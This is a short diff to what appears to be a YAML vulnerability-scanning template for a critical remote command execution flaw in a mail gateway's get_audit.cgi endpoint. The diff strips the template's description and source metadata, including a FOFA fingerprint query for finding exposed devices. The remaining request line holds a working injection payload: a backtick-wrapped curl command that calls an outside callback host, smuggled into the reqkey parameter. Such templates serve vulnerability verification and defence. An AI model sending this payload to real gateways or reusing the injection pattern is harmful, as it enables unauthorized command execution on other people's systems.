@@ -3,12 +3,8 @@ info:
   name: 方向标邮件网关 get_audit.cgi 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/laqdaotqde7ql59t'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: laqdaotqde7ql59t
-    fofa: header="fm_chk_cookie_ok"
 http:
 - raw:
   - 'GET /common/cgi/get_audit.cgi?_mode=get_raw_file&reqkey=;`curl+lwdjdkcqdn.lfcx.eu.org` HTTP/1.1
